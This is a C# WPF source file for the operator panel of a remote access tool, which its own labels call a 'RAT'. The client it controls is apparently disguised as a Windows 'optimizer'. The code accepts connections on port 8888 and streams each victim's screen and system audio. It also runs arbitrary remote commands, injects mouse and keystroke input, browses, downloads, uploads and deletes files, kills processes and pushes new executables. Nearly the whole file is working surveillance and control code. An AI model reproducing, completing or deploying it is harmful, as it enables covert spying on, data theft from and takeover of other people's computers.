using System;
using System.Collections.ObjectModel;
using System.Net;
using System.Net.Sockets;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows;
using System.Windows.Controls;
using System.Windows.Media.Imaging;
using System.IO;
using System.Text.Json;
using System.Collections.Generic;
using NAudio.Wave;

namespace OptimizadorAdmin
{
    public class ConnectedClient
    {
        public string ComputerName { get; set; } = "Desconocido";
        public string IPAddress { get; set; } = "0.0.0.0";
        public string RAMUsage { get; set; } = "--";
        public string Status { get; set; } = "En Espera";
        public TcpClient Client { get; set; }
    }

    public class RemoteFile
    {
        public string Name { get; set; }
        public bool IsDirectory { get; set; }
        public string Icon { get; set; }
        public string SizeStr { get; set; }
        public string Date { get; set; }
    }

    public class RemoteProcess
    {
        public int Id { get; set; }
        public string Name { get; set; }
        public long Memory { get; set; }
        public string Title { get; set; }
    }

    public partial class MainWindow : Window
    {
        public ObservableCollection<ConnectedClient> ConnectedClients { get; set; }
        public ObservableCollection<RemoteProcess> CurrentRemoteProcesses { get; set; }
        public ObservableCollection<RemoteFile> CurrentRemoteFiles { get; set; }
        
        private TcpListener _server;
        private bool _isRunning = false;
        private ConnectedClient _ratTargetClient = null;
        private System.Windows.Threading.DispatcherTimer _liveTimer;
        
        // Audio Logic
        private IWavePlayer _audioPlayer;
        private BufferedWaveProvider _audioProvider;
        private WaveFormat _currentAudioFormat;
        private int _remoteWidth, _remoteHeight;
        private double _lastSentX, _lastSentY;
        private bool _isWaitingForScreen = false;

        public MainWindow()
        {
            InitializeComponent();
            ConnectedClients = new ObservableCollection<ConnectedClient>();
            CurrentRemoteProcesses = new ObservableCollection<RemoteProcess>();
            CurrentRemoteFiles = new ObservableCollection<RemoteFile>();
            
            ClientsListView.ItemsSource = ConnectedClients;
            RatProcessesList.ItemsSource = CurrentRemoteProcesses;
            RatFilesList.ItemsSource = CurrentRemoteFiles;
            
            StartServer();

            // Init Live Screen Timer
            _liveTimer = new System.Windows.Threading.DispatcherTimer();
            _liveTimer.Interval = TimeSpan.FromMilliseconds(800);
            _liveTimer.Tick += LiveTimer_Tick;
        }

        private void LiveTimer_Tick(object? sender, EventArgs e)
        {
            if (_ratTargetClient != null && CheckLiveScreen.IsChecked == true && !_isWaitingForScreen)
            {
                _isWaitingForScreen = true;
                SendCommandToSpecific(_ratTargetClient, "CMD|GET_SCREENSHOT");
            }
        }

        private async void StartServer()
        {
            try
            {
                _server = new TcpListener(IPAddress.Any, 8888);
                _server.Start();
                _isRunning = true;
                string localIp = GetLocalIPAddress();
                ServerStatusText.Text = $"Escuchando en {localIp}:8888";
                ServerStatusText.Foreground = new System.Windows.Media.SolidColorBrush((System.Windows.Media.Color)System.Windows.Media.ColorConverter.ConvertFromString("#A6E3A1"));

                while (_isRunning)
                {
                    TcpClient client = await _server.AcceptTcpClientAsync();
                    _ = HandleClientAsync(client);
                }
            }
            catch (Exception ex)
            {
                MessageBox.Show("Error iniciando servidor central: " + ex.Message);
            }
        }

        private async Task HandleClientAsync(TcpClient client)
        {
            var endPoint = client.Client.RemoteEndPoint as IPEndPoint;
            string ip = endPoint?.Address.ToString() ?? "Unknown";
            
            var newClient = new ConnectedClient { IPAddress = ip, Client = client, Status = "Conectado" };
            
            Dispatcher.Invoke(() => {
                ConnectedClients.Add(newClient);
                UpdateClientCount();
            });

            try
            {
                NetworkStream stream = client.GetStream();
                while (true)
                {
                    // 1. Leer tamaño del mensaje (4 bytes)
                    byte[] sizeBuffer = new byte[4];
                    int totalRead = 0;
                    while (totalRead < 4) {
                        int r = await stream.ReadAsync(sizeBuffer, totalRead, 4 - totalRead);
                        if (r <= 0) return;
                        totalRead += r;
                    }
                    int messageSize = BitConverter.ToInt32(sizeBuffer, 0);

                    // 2. Leer el mensaje completo
                    byte[] msgBuffer = new byte[messageSize];
                    totalRead = 0;
                    while (totalRead < messageSize) {
                        int r = await stream.ReadAsync(msgBuffer, totalRead, messageSize - totalRead);
                        if (r <= 0) return;
                        totalRead += r;
                    }

                    string msg = Encoding.UTF8.GetString(msgBuffer);
                    if (!string.IsNullOrWhiteSpace(msg))
                    {
                        ProcessMessage(newClient, msg);
                    }
                }
            }
            catch
            {
                // Disconnected
            }
            finally
            {
                Dispatcher.Invoke(() => {
                    ConnectedClients.Remove(newClient);
                    UpdateClientCount();
                });
                client.Close();
            }
        }

        private void ProcessMessage(ConnectedClient client, string message)
        {
            if (string.IsNullOrWhiteSpace(message)) return;

            // Evitar split total para mensajes de datos pesados
            if (message.StartsWith("PROCESS_LIST|"))
            {
                string json = message.Substring("PROCESS_LIST|".Length);
                try {
                    var list = JsonSerializer.Deserialize<List<RemoteProcess>>(json);
                    if (list != null)
                    {
                        Dispatcher.Invoke(() => {
                            CurrentRemoteProcesses.Clear();
                            foreach(var p in list) CurrentRemoteProcesses.Add(p);
                        });
                    }
                } catch { }
                return;
            }

            if (message.StartsWith("AUDIO_FORMAT|"))
            {
                var fParts = message.Split('|');
                if (fParts.Length >= 5)
                {
                    try {
                        int rate = int.Parse(fParts[1]);
                        int bits = int.Parse(fParts[2]);
                        int channels = int.Parse(fParts[3]);
                        int encoding = int.Parse(fParts[4]);

                        // WASAPI Loopback is usually IeeeFloat (encoding == 3)
                        WaveFormat format = (encoding == 3) 
                            ? WaveFormat.CreateIeeeFloatWaveFormat(rate, channels) 
                            : new WaveFormat(rate, bits, channels);

                        Dispatcher.Invoke(() => {
                            SetupAudioPlayer(format);
                            AudioStatusText.Text = "STREAMING...";
                            AudioStatusText.Foreground = (System.Windows.Media.SolidColorBrush)new System.Windows.Media.BrushConverter().ConvertFrom("#A6E3A1");
                        });
                    } catch { }
                }
                return;
            }

            if (message.StartsWith("AUDIO_DATA|"))
            {
                string b64 = message.Substring("AUDIO_DATA|".Length);
                if (_audioProvider != null)
                {
                    try {
                        byte[] data = Convert.FromBase64String(b64);
                        _audioProvider.AddSamples(data, 0, data.Length);
                    } catch { }
                }
                return;
            }
            
            if (message.StartsWith("SCREENSHOT_DATA|"))
            {
                try {
                    // SCREENSHOT_DATA|W|H|B64...
                    int firstPipe = message.IndexOf('|');
                    int secondPipe = message.IndexOf('|', firstPipe + 1);
                    int thirdPipe = message.IndexOf('|', secondPipe + 1);

                    if (firstPipe != -1 && secondPipe != -1 && thirdPipe != -1)
                    {
                        string sW = message.Substring(firstPipe + 1, secondPipe - firstPipe - 1);
                        string sH = message.Substring(secondPipe + 1, thirdPipe - secondPipe - 1);
                        string b64 = message.Substring(thirdPipe + 1);

                        _remoteWidth = int.Parse(sW);
                        _remoteHeight = int.Parse(sH);

                        Dispatcher.Invoke(() => {
                            try {
                                byte[] imageBytes = Convert.FromBase64String(b64);
                                using (var ms = new MemoryStream(imageBytes))
                                {
                                    var bitmap = new BitmapImage();
                                    bitmap.BeginInit();
                                    bitmap.CacheOption = BitmapCacheOption.OnLoad;
                                    bitmap.StreamSource = ms;
                                    bitmap.EndInit();
                                    RatScreenImg.Source = bitmap;
                                    if (FullscreenRatGrid.Visibility == Visibility.Visible)
                                        RatFullscreenImg.Source = bitmap;
                                }
                                _isWaitingForScreen = false; // Libre para pedir otra
                            } catch { }
                        });
                    }
                } catch { }
                return;
            }

            if (message.StartsWith("FILE_LIST_DATA|"))
            {
                string json = message.Substring("FILE_LIST_DATA|".Length);
                try {
                    var list = JsonSerializer.Deserialize<List<RemoteFile>>(json);
                    if (list != null)
                    {
                        Dispatcher.Invoke(() => {
                            CurrentRemoteFiles.Clear();
                            foreach(var f in list) CurrentRemoteFiles.Add(f);
                        });
                    }
                } catch { }
                return;
            }

            if (message.StartsWith("FILE_DOWNLOAD_DATA|"))
            {
                try {
                    var fileParts = message.Split('|', 3);
                    if (fileParts.Length == 3) {
                        string fileName = fileParts[1];
                        string b64 = fileParts[2];
                        Dispatcher.Invoke(() => {
                            var saveDlg = new Microsoft.Win32.SaveFileDialog { FileName = fileName };
                            if (saveDlg.ShowDialog() == true) {
                                File.WriteAllBytes(saveDlg.FileName, Convert.FromBase64String(b64));
                                MessageBox.Show("Archivo descargado con éxito.", "RAT Explorer");
                            }
                        });
                    }
                } catch { }
                return;
            }

            if (message.StartsWith("CMD_RESULT|"))
            {
                string output = message.Substring("CMD_RESULT|".Length);
                Dispatcher.Invoke(() => {
                    RatConsoleOutput.AppendText($"\n{output}\n");
                    RatConsoleOutput.ScrollToEnd();
                });
                return;
            }

            // Para mensajes cortos de control tipo INFO o STATUS
            var parts = message.Split('|');
            if (parts.Length == 0) return;

            if (parts[0] == "INFO")
            {
                Dispatcher.Invoke(() => {
                    if (parts.Length >= 4)
                    {
                        client.ComputerName = parts[1];
                        client.RAMUsage = $"{parts[2]} | Disco: {parts[3]}";
                    }
                    else if (parts.Length >= 3)
                    {
                        client.ComputerName = parts[1];
                        client.RAMUsage = parts[2];
                    }
                    
                    int index = ConnectedClients.IndexOf(client);
                    if (index >= 0) ConnectedClients[index] = client;
                });
            }
            else if (parts[0] == "STATUS" && parts.Length >= 2)
            {
                 Dispatcher.Invoke(() => {
                    client.Status = parts[1];
                    int index = ConnectedClients.IndexOf(client);
                    if (index >= 0) ConnectedClients[index] = client;
                });
            }
        }

        private void UpdateClientCount()
        {
            ConnectedCountText.Text = $"Múltiples Clientes Conectados: {ConnectedClients.Count}";
        }

        private void SendCommandToSelected(string command)
        {
            var selected = ClientsListView.SelectedItem as ConnectedClient;
            if (selected == null)
            {
                CommandFeedbackText.Text = "⚠️ Error: Selecciona un cliente en la lista primero.";
                return;
            }

            try
            {
                NetworkStream stream = selected.Client.GetStream();
                byte[] msgBytes = Encoding.UTF8.GetBytes(command);
                byte[] sizeBytes = BitConverter.GetBytes(msgBytes.Length);
                
                stream.Write(sizeBytes, 0, 4);
                stream.Write(msgBytes, 0, msgBytes.Length);
                stream.Flush();

                CommandFeedbackText.Text = $"✅ Orden enviada a {selected.ComputerName}: {command}";
                selected.Status = "Ejecutando orden...";
                
                Dispatcher.Invoke(() => {
                    int index = ConnectedClients.IndexOf(selected);
                    if (index >= 0) ConnectedClients[index] = selected;
                });
            }
            catch (Exception ex)
            {
                CommandFeedbackText.Text = $"❌ Falla de conexión con {selected.ComputerName}: " + ex.Message;
            }
        }

        // --- Botones de Comandos UI BÁSICOS ---
        private void Cmd_QuickClean_Click(object sender, RoutedEventArgs e) => SendCommandToSelected("CMD|QuickClean");
        private void Cmd_FreeRAM_Click(object sender, RoutedEventArgs e) => SendCommandToSelected("CMD|FreeRAM");
        private void Cmd_GameMode_Click(object sender, RoutedEventArgs e) => SendCommandToSelected("CMD|GameMode");
        private void Cmd_SystemRepair_Click(object sender, RoutedEventArgs e) => SendCommandToSelected("CMD|SystemRepair");
        private void Cmd_UpdateApps_Click(object sender, RoutedEventArgs e) => SendCommandToSelected("CMD|WingetUpdate");

        // --- Botones de Comandos EXTREMOS (CONTROL TOTAL) ---
        private void Cmd_PowerOff_Click(object sender, RoutedEventArgs e)
        {
            var result = MessageBox.Show("¿Apagar remotamente el PC seleccionado? Se perderán datos no guardados.", "PELIGRO", MessageBoxButton.YesNo, MessageBoxImage.Warning);
            if (result == MessageBoxResult.Yes) SendCommandToSelected("CMD|PowerOff");
        }

        private void Cmd_Restart_Click(object sender, RoutedEventArgs e)
        {
            var result = MessageBox.Show("¿Reiniciar remotamente el PC seleccionado?", "PELIGRO", MessageBoxButton.YesNo, MessageBoxImage.Warning);
            if (result == MessageBoxResult.Yes) SendCommandToSelected("CMD|Restart");
        }

        private void Cmd_KillProcess_Click(object sender, RoutedEventArgs e)
        {
            string procName = KillProcessBox.Text.Trim();
            if (string.IsNullOrEmpty(procName))
            {
                MessageBox.Show("Escribe el nombre de un proceso para matar (ej: chrome)");
                return;
            }
            var result = MessageBox.Show($"¿Forzar cierre de todos los procesos '{procName}'?", "Confirmar", MessageBoxButton.YesNo, MessageBoxImage.Exclamation);
            if (result == MessageBoxResult.Yes) SendCommandToSelected($"CMD|KillProcess|{procName}");
        }

        private void Cmd_RunScript_Click(object sender, RoutedEventArgs e)
        {
            string script = TerminalBox.Text.Trim();
            if (string.IsNullOrEmpty(script))
            {
                MessageBox.Show("Escribe un comando para ejecutar remotamente");
                return;
            }
            var result = MessageBox.Show($"Se ejecutará el siguiente comando en el PC cliente:\n\n{script}\n\n¿Estás seguro?", "Consola Remota", MessageBoxButton.YesNo, MessageBoxImage.Warning);
            if (result == MessageBoxResult.Yes) SendCommandToSelected($"CMD|RunScript|{script}");
        }

        private void Cmd_ShowMsg_Click(object sender, RoutedEventArgs e)
        {
            string msg = MessageBoxInput.Text.Trim();
            if (string.IsNullOrEmpty(msg)) return;
            SendCommandToSelected($"CMD|SHOW_MSG|{msg}");
        }

        private void CloseRatPanel_Click(object sender, RoutedEventArgs e)
        {
            CheckLiveScreen.IsChecked = false; // Stop live if active
            CheckRemoteControl.IsChecked = false;
            RatOverlayGrid.Visibility = Visibility.Collapsed;
            _ratTargetClient = null;
            _remoteWidth = 0;
            _remoteHeight = 0;
            _isWaitingForScreen = false;
        }

        private void ClientsListView_MouseDoubleClick(object sender, System.Windows.Input.MouseButtonEventArgs e)
        {
            var selected = ClientsListView.SelectedItem as ConnectedClient;
            if (selected != null) OpenRatPanel(selected);
        }

        private void Menu_OpenRat_Click(object sender, RoutedEventArgs e)
        {
            var selected = ClientsListView.SelectedItem as ConnectedClient;
            if (selected != null) OpenRatPanel(selected);
        }

        private void OpenRatPanel(ConnectedClient selected)
        {
            _ratTargetClient = selected;
            RatTitleText.Text = $"Administración RAT - {selected.ComputerName} ({selected.IPAddress})";
            RatOverlayGrid.Visibility = Visibility.Visible;
            
            // Proactividad: Entrar directo a control de pantalla y activar streaming por defecto
            if (BtnTabPantalla != null) BtnTabPantalla.IsChecked = true;
            if (CheckLiveScreen != null) CheckLiveScreen.IsChecked = true;
            if (CheckRemoteControl != null) CheckRemoteControl.IsChecked = true;
            
            SendCommandToSpecific(selected, "CMD|GET_PROCESSES");
        }

        private void RatTab_Checked(object sender, RoutedEventArgs e)
        {
            if (View_RatProcesses == null || View_RatConsole == null || View_RatScreen == null || View_RatAudio == null || View_RatFiles == null || View_RatSystem == null) return;
            
            View_RatProcesses.Visibility = Visibility.Collapsed;
            View_RatConsole.Visibility = Visibility.Collapsed;
            View_RatScreen.Visibility = Visibility.Collapsed;
            View_RatAudio.Visibility = Visibility.Collapsed;
            View_RatFiles.Visibility = Visibility.Collapsed;
            View_RatSystem.Visibility = Visibility.Collapsed;

            if (BtnTabProcesos.IsChecked == true) View_RatProcesses.Visibility = Visibility.Visible;
            else if (BtnTabConsola.IsChecked == true) View_RatConsole.Visibility = Visibility.Visible;
            else if (BtnTabPantalla.IsChecked == true) View_RatScreen.Visibility = Visibility.Visible;
            else if (BtnTabAudio.IsChecked == true) View_RatAudio.Visibility = Visibility.Visible;
            else if (BtnTabSistema.IsChecked == true) View_RatSystem.Visibility = Visibility.Visible;
            else if (BtnTabExplorador.IsChecked == true) {
                View_RatFiles.Visibility = Visibility.Visible;
                if (_ratTargetClient != null && string.IsNullOrEmpty(RatExplorerPath.Text)) {
                    SendCommandToSpecific(_ratTargetClient, "CMD|GET_DRIVES");
                }
            }
        }

        private async void Rat_UpdateClient_Click(object sender, RoutedEventArgs e)
        {
            if (_ratTargetClient == null) return;
            
            string installerPath = Path.Combine(AppDomain.CurrentDomain.BaseDirectory, "Instalar_Tosito_Optimizer_V2.exe");
            if (!File.Exists(installerPath))
                installerPath = @"c:\Users\Tosito\Desktop\Tosito\windows\Optimizacion\src\Instalar_Tosito_Optimizer_V2.exe";

            if (!File.Exists(installerPath))
            {
                MessageBox.Show("No se encontró el instalador ('Instalar_Tosito_Optimizer_V2.exe'). Asegúrate de haberlo generado.", "Error", MessageBoxButton.OK, MessageBoxImage.Error);
                return;
            }

            var confirm = MessageBox.Show($"¿Deseas enviar la actualización al equipo '{_ratTargetClient.ComputerName}'?", "Confirmar Actualización", MessageBoxButton.YesNo, MessageBoxImage.Question);
            if (confirm != MessageBoxResult.Yes) return;

            try
            {
                UpdateStatusText.Text = "⏳ Preparando datos...";
                byte[] bytes = await Task.Run(() => File.ReadAllBytes(installerPath));
                string base64 = Convert.ToBase64String(bytes);
                
                UpdateStatusText.Text = "📤 Enviando actualización (220MB)...";
                await Task.Run(() => {
                    NetworkStream stream = _ratTargetClient.Client.GetStream();
                    byte[] msgBytes = Encoding.UTF8.GetBytes($"CMD|UPDATE_CLIENT|{base64}");
                    byte[] sizeBytes = BitConverter.GetBytes(msgBytes.Length);
                    
                    stream.Write(sizeBytes, 0, 4);
                    stream.Write(msgBytes, 0, msgBytes.Length);
                    stream.Flush();
                });
                
                UpdateStatusText.Text = "✅ ¡Enviado! El cliente se reiniciará.";
            }
            catch (Exception ex)
            {
                UpdateStatusText.Text = "❌ Error: " + ex.Message;
                MessageBox.Show("Fallo al enviar actualización: " + ex.Message);
            }
        }

        private void Rat_RefreshProcesses_Click(object sender, RoutedEventArgs e)
        {
            if (_ratTargetClient != null) SendCommandToSpecific(_ratTargetClient, "CMD|GET_PROCESSES");
        }

        private void Rat_KillSelectedProcess_Click(object sender, RoutedEventArgs e)
        {
            var selectedProc = RatProcessesList.SelectedItem as RemoteProcess;
            if (selectedProc != null && _ratTargetClient != null)
            {
                var result = MessageBox.Show($"¿Matar proceso {selectedProc.Name} (PID: {selectedProc.Id})?", "Confirmar", MessageBoxButton.YesNo, MessageBoxImage.Warning);
                if (result == MessageBoxResult.Yes) 
                    SendCommandToSpecific(_ratTargetClient, $"CMD|KillProcess|{selectedProc.Id}");
            }
        }

        private void RatConsoleInput_KeyDown(object sender, System.Windows.Input.KeyEventArgs e)
        {
            if (e.Key == System.Windows.Input.Key.Enter && _ratTargetClient != null)
            {
                string cmd = RatConsoleInput.Text.Trim();
                if (!string.IsNullOrEmpty(cmd))
                {
                    RatConsoleOutput.AppendText($"\n> {cmd}\n");
                    SendCommandToSpecific(_ratTargetClient, $"CMD|RunScript|{cmd}");
                    RatConsoleInput.Clear();
                }
            }
        }

        private void Rat_GetScreen_Click(object sender, RoutedEventArgs e)
        {
            if (_ratTargetClient != null) SendCommandToSpecific(_ratTargetClient, "CMD|GET_SCREENSHOT");
        }

        // --- AUDIO RAT CONTROL ---
        private void BtnStartAudio_Click(object sender, RoutedEventArgs e)
        {
            if (_ratTargetClient != null) {
                SendCommandToSpecific(_ratTargetClient, "CMD|START_AUDIO");
                AudioStatusText.Text = "SOLICITANDO STREAM...";
                AudioStatusText.Foreground = (System.Windows.Media.SolidColorBrush)new System.Windows.Media.BrushConverter().ConvertFrom("#F9E2AF");
            }
        }

        private void BtnStopAudio_Click(object sender, RoutedEventArgs e)
        {
            if (_ratTargetClient != null) {
                SendCommandToSpecific(_ratTargetClient, "CMD|STOP_AUDIO");
            }
            StopLocalAudio();
        }

        private void SetupAudioPlayer(WaveFormat format)
        {
            try {
                StopLocalAudio();
                
                _audioProvider = new BufferedWaveProvider(format);
                _audioProvider.DiscardOnBufferOverflow = true;
                _audioProvider.BufferLength = format.AverageBytesPerSecond * 2; // 2 seconds

                _audioPlayer = new WaveOutEvent();
                _audioPlayer.Init(_audioProvider);
                _audioPlayer.Play();
            } catch (Exception ex) {
                MessageBox.Show("Error iniciando el motor de audio: " + ex.Message);
            }
        }

        private void StopLocalAudio()
        {
            try {
                if (_audioPlayer != null) {
                    _audioPlayer.Stop();
                    _audioPlayer.Dispose();
                    _audioPlayer = null;
                }
                _audioProvider = null;
                if (AudioStatusText != null) {
                    AudioStatusText.Text = "DESCONECTADO";
                    AudioStatusText.Foreground = (System.Windows.Media.SolidColorBrush)new System.Windows.Media.BrushConverter().ConvertFrom("#F38BA8");
                }
            } catch { }
        }

        private string GetLocalIPAddress()
        {
            try
            {
                var host = Dns.GetHostEntry(Dns.GetHostName());
                foreach (var ip in host.AddressList)
                {
                    if (ip.AddressFamily == AddressFamily.InterNetwork && !ip.ToString().StartsWith("127."))
                    {
                        return ip.ToString();
                    }
                }
            }
            catch { }
            return "127.0.0.1";
        }

        private void SendCommandToSpecific(ConnectedClient target, string command)
        {
            try
            {
                NetworkStream stream = target.Client.GetStream();
                byte[] msgBytes = Encoding.UTF8.GetBytes(command);
                byte[] sizeBytes = BitConverter.GetBytes(msgBytes.Length);
                
                stream.Write(sizeBytes, 0, 4);
                stream.Write(msgBytes, 0, msgBytes.Length);
                stream.Flush();
                
                CommandFeedbackText.Text = $"✅ Orden enviada a {target.ComputerName}: {command}";
            }
            catch (Exception ex)
            {
                CommandFeedbackText.Text = $"❌ Falla de envío a {target.ComputerName}: " + ex.Message;
            }
        }
        private void RefreshInfo_MenuItem_Click(object sender, RoutedEventArgs e)
        {
            var selected = ClientsListView.SelectedItem as ConnectedClient;
            if (selected != null) SendCommandToSpecific(selected, "CMD|QuickClean"); // Fallback a algo inofensivo
        }

        private void CheckLiveScreen_Checked(object sender, RoutedEventArgs e)
        {
            if (LiveStatusText != null) 
            {
                LiveStatusText.Text = "• EN VIVO";
                LiveStatusText.Foreground = (System.Windows.Media.SolidColorBrush)new System.Windows.Media.BrushConverter().ConvertFrom("#A6E3A1");
            }
            _liveTimer.Start();
        }

        private void CheckLiveScreen_Unchecked(object sender, RoutedEventArgs e)
        {
            if (LiveStatusText != null)
            {
                LiveStatusText.Text = "• PAUSADO";
                LiveStatusText.Foreground = (System.Windows.Media.SolidColorBrush)new System.Windows.Media.BrushConverter().ConvertFrom("#F38BA8");
            }
            _liveTimer.Stop();
        }

        private void CheckRemoteControl_Checked(object sender, RoutedEventArgs e)
        {
            // Si el usuario activa control remoto, forzamos el streaming para que vea lo que hace
            if (CheckLiveScreen != null && CheckLiveScreen.IsChecked == false)
            {
                CheckLiveScreen.IsChecked = true;
            }
        }

        private void RatScreenImg_MouseMove(object sender, System.Windows.Input.MouseEventArgs e)
        {
            if (CheckRemoteControl.IsChecked == true && _ratTargetClient != null && _remoteWidth > 0 && sender is System.Windows.Controls.Image img && img.Source != null)
            {
                var pos = e.GetPosition(img);
                Point mapped = MapCoordinates(pos, img);

                if (mapped.X >= 0 && (Math.Abs(mapped.X - _lastSentX) > 5 || Math.Abs(mapped.Y - _lastSentY) > 5))
                {
                    SendCommandToSpecific(_ratTargetClient, $"CMD|MOUSE_MOVE|{(int)mapped.X},{(int)mapped.Y}");
                    _lastSentX = mapped.X;
                    _lastSentY = mapped.Y;
                }
            }
        }

        private void RatScreenImg_MouseDown(object sender, System.Windows.Input.MouseButtonEventArgs e)
        {
            if (CheckRemoteControl.IsChecked == true && _ratTargetClient != null && sender is System.Windows.Controls.Image img)
            {
                img.CaptureMouse();
                if (e.ChangedButton == System.Windows.Input.MouseButton.Left)
                {
                    if (e.ClickCount == 2) SendCommandToSpecific(_ratTargetClient, "CMD|MOUSE_DBLCLICK|LEFT");
                    else SendCommandToSpecific(_ratTargetClient, "CMD|MOUSE_DOWN|LEFT");
                }
                else if (e.ChangedButton == System.Windows.Input.MouseButton.Right)
                {
                    SendCommandToSpecific(_ratTargetClient, "CMD|MOUSE_DOWN|RIGHT");
                }
            }
        }

        private void RatScreenImg_MouseUp(object sender, System.Windows.Input.MouseButtonEventArgs e)
        {
            if (CheckRemoteControl.IsChecked == true && _ratTargetClient != null && sender is System.Windows.Controls.Image img)
            {
                img.ReleaseMouseCapture();
                if (e.ChangedButton == System.Windows.Input.MouseButton.Left) SendCommandToSpecific(_ratTargetClient, "CMD|MOUSE_UP|LEFT");
                else if (e.ChangedButton == System.Windows.Input.MouseButton.Right) SendCommandToSpecific(_ratTargetClient, "CMD|MOUSE_UP|RIGHT");
            }
        }

        private void RatScreenImg_MouseRightButtonDown(object sender, System.Windows.Input.MouseButtonEventArgs e)
        {
            // Handled in MouseDown
        }

        private void RatScreenImg_MouseWheel(object sender, System.Windows.Input.MouseWheelEventArgs e)
        {
             if (CheckRemoteControl.IsChecked == true && _ratTargetClient != null)
            {
                SendCommandToSpecific(_ratTargetClient, $"CMD|MOUSE_WHEEL|{e.Delta}");
            }
        }

        private void BtnFullscreen_Click(object sender, RoutedEventArgs e)
        {
            FullscreenRatGrid.Visibility = Visibility.Visible;
            if (RatScreenImg.Source != null) RatFullscreenImg.Source = RatScreenImg.Source;
        }

        private void ExitFullscreen_Click(object sender, RoutedEventArgs e)
        {
            FullscreenRatGrid.Visibility = Visibility.Collapsed;
        }

        private Point MapCoordinates(Point localPos, System.Windows.Controls.Image img)
        {
            if (img.Source == null || _remoteWidth == 0) return new Point(-1, -1);

            double ctrlW = img.ActualWidth;
            double ctrlH = img.ActualHeight;
            double imgW = img.Source.Width;
            double imgH = img.Source.Height;

            double ratio = Math.Min(ctrlW / imgW, ctrlH / imgH);
            double actW = imgW * ratio;
            double actH = imgH * ratio;

            double offX = (ctrlW - actW) / 2;
            double offY = (ctrlH - actH) / 2;

            double relX = (localPos.X - offX) / actW;
            double relY = (localPos.Y - offY) / actH;

            if (relX < 0) relX = 0; if (relX > 1) relX = 1;
            if (relY < 0) relY = 0; if (relY > 1) relY = 1;
            
            if (localPos.X < offX || localPos.X > (offX + actW) || localPos.Y < offY || localPos.Y > (offY + actH))
                return new Point(-1, -1);

            return new Point(relX * _remoteWidth, relY * _remoteHeight);
        }

        // --- Explorador de Archivos RAT ---
        private void Rat_ExplorerHome_Click(object sender, RoutedEventArgs e)
        {
            RatExplorerPath.Text = "";
            if (_ratTargetClient != null) SendCommandToSpecific(_ratTargetClient, "CMD|GET_DRIVES");
        }

        private void Rat_ExplorerUp_Click(object sender, RoutedEventArgs e)
        {
            string current = RatExplorerPath.Text;
            if (string.IsNullOrEmpty(current)) return;
            try {
                var parent = Directory.GetParent(current);
                if (parent != null) {
                    RatExplorerPath.Text = parent.FullName;
                    SendCommandToSpecific(_ratTargetClient, $"CMD|LIST_FILES|{parent.FullName}");
                } else {
                    Rat_ExplorerHome_Click(null, null);
                }
            } catch { }
        }

        private void RatExplorerPath_KeyDown(object sender, System.Windows.Input.KeyEventArgs e)
        {
            if (e.Key == System.Windows.Input.Key.Enter && _ratTargetClient != null)
            {
                SendCommandToSpecific(_ratTargetClient, $"CMD|LIST_FILES|{RatExplorerPath.Text}");
            }
        }

        private void RatFilesList_MouseDoubleClick(object sender, System.Windows.Input.MouseButtonEventArgs e)
        {
            var selected = RatFilesList.SelectedItem as RemoteFile;
            if (selected != null && selected.IsDirectory && _ratTargetClient != null)
            {
                string newPath = Path.Combine(RatExplorerPath.Text, selected.Name);
                // Si la ruta actual es vacía, el nombre es la unidad (ej: C:\)
                if (string.IsNullOrEmpty(RatExplorerPath.Text)) newPath = selected.Name;
                
                RatExplorerPath.Text = newPath;
                SendCommandToSpecific(_ratTargetClient, $"CMD|LIST_FILES|{newPath}");
            }
        }

        private void Rat_DownloadFile_Click(object sender, RoutedEventArgs e)
        {
            var selected = RatFilesList.SelectedItem as RemoteFile;
            if (selected != null && !selected.IsDirectory && _ratTargetClient != null)
            {
                string fullPath = Path.Combine(RatExplorerPath.Text, selected.Name);
                SendCommandToSpecific(_ratTargetClient, $"CMD|DOWNLOAD_FILE|{fullPath}");
            }
        }

        private void Rat_UploadFile_Click(object sender, RoutedEventArgs e)
        {
            if (_ratTargetClient == null) return;
            var openDlg = new Microsoft.Win32.OpenFileDialog();
            if (openDlg.ShowDialog() == true) {
                try {
                    byte[] fileBytes = File.ReadAllBytes(openDlg.FileName);
                    string remotePath = Path.Combine(RatExplorerPath.Text, Path.GetFileName(openDlg.FileName));
                    SendCommandToSpecific(_ratTargetClient, $"CMD|UPLOAD_FILE|{remotePath}|{Convert.ToBase64String(fileBytes)}");
                    MessageBox.Show("Archivo enviado al cliente.", "RAT Explorer");
                    SendCommandToSpecific(_ratTargetClient, $"CMD|LIST_FILES|{RatExplorerPath.Text}");
                } catch (Exception ex) { MessageBox.Show("Error subir: " + ex.Message); }
            }
        }

        private void Rat_DeleteFile_Click(object sender, RoutedEventArgs e)
        {
            var selected = RatFilesList.SelectedItem as RemoteFile;
            if (selected != null && _ratTargetClient != null)
            {
                var result = MessageBox.Show($"¿Borrar '{selected.Name}' permanentemente?", "Confirmar Borrado", MessageBoxButton.YesNo, MessageBoxImage.Warning);
                if (result == MessageBoxResult.Yes) {
                    string fullPath = Path.Combine(RatExplorerPath.Text, selected.Name);
                    SendCommandToSpecific(_ratTargetClient, $"CMD|DELETE_FILE|{fullPath}");
                    SendCommandToSpecific(_ratTargetClient, $"CMD|LIST_FILES|{RatExplorerPath.Text}");
                }
            }
        }

        private void Window_KeyDown(object sender, System.Windows.Input.KeyEventArgs e)
        {
            if (e.Key == System.Windows.Input.Key.Escape && FullscreenRatGrid.Visibility == Visibility.Visible)
            {
                ExitFullscreen_Click(null, null);
                return;
            }

            // Si el foco está en un TextBox (Consola, Entrada de comando, Ruta del explorador), no capturamos.
            if (System.Windows.Input.Keyboard.FocusedElement is System.Windows.Controls.TextBox) return;

            if (CheckRemoteControl.IsChecked == true && _ratTargetClient != null && RatOverlayGrid.Visibility == Visibility.Visible)
            {
                int vk = System.Windows.Input.KeyInterop.VirtualKeyFromKey(e.Key == System.Windows.Input.Key.System ? e.SystemKey : e.Key);
                SendCommandToSpecific(_ratTargetClient, $"CMD|KEY_DOWN|{vk}");
                e.Handled = true;
            }
        }

        private void Window_KeyUp(object sender, System.Windows.Input.KeyEventArgs e)
        {
            if (System.Windows.Input.Keyboard.FocusedElement is System.Windows.Controls.TextBox) return;

            if (CheckRemoteControl.IsChecked == true && _ratTargetClient != null && RatOverlayGrid.Visibility == Visibility.Visible)
            {
                int vk = System.Windows.Input.KeyInterop.VirtualKeyFromKey(e.Key == System.Windows.Input.Key.System ? e.SystemKey : e.Key);
                SendCommandToSpecific(_ratTargetClient, $"CMD|KEY_UP|{vk}");
                e.Handled = true;
            }
        }
    }
}
